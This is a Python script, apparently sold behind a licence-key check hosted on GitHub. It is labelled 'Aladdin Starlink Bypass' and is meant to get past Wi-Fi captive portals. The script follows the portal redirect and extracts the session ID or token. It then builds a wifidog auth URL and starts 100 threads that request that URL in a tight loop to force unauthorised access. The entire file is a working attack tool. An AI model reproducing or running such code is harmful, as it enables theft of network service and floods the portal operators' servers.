import requests, re, urllib3, time, threading, os, random, hashlib, ssl, json, subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
KEY_URL = "https://raw.githubusercontent.com/5Lkhant09/my-license-server/main/key.txt"
MY_ID = "TRB-ADMIN77" 

def check_license():
    os.system('clear')
    print(f"\033[93m =======================================")
    print(f"\033[96m   Aladdin Starlink Bypass - IMMORTAL V11")
    print(f"\033[93m =======================================\n")
    print(f"\033[94m[*] YOUR DEVICE ID: {MY_ID}\033[0m")
    input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()
    
    try:
        response = requests.get(KEY_URL, timeout=10, verify=False).text
        for line in response.splitlines():
            line = line.strip()
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 3:
                    db_id, db_key, db_expiry = [p.strip() for p in parts]
                    if db_id == MY_ID and db_key == input_key:
                        expiry_dt = datetime.strptime(db_expiry, "%d-%m-%Y %H:%M")
                        if datetime.now() < expiry_dt:
                            print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_expiry}\033[0m")
                            time.sleep(1.5)
                            return True
                        else:
                            print("\033[91m[!] KEY EXPIRED!\033[0m")
                            return False
        print("\033[91m[!] INVALID KEY OR ID NOT REGISTERED.\033[0m")
        return False
    except:
        print("\033[91m[!] CONNECTION ERROR! (Check Internet)\033[0m")
        return False

def high_speed_pulse(link):
    while True:
        try:
            requests.get(link, timeout=5, verify=False)
            print(f"\033[92m[✓] Aladdin Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except: break

def start_bypass():
    if not check_license(): return
    print("\033[94m[*] Aladdin Force Scanning Portal...\033[0m")
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            sid_match = re.search(r'sessionId=([^&" \']+)', r.url) or re.search(r'token=([^&" \']+)', r.url)
            if sid_match:
                sid = sid_match.group(1)
                p_url = urlparse(r.url)
                auth_link = f"{p_url.scheme}://{p_url.netloc}/wifidog/auth?token={sid}"
                print("\033[95m[*] ⚡ Launching Bypass Threads... ⚡\033[0m")
                for _ in range(100):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                while True: time.sleep(10)
            else: time.sleep(2)
        except: time.sleep(2)

if __name__ == "__main__":
    try: start_bypass()
    except KeyboardInterrupt: print("\nStopped.")
                    
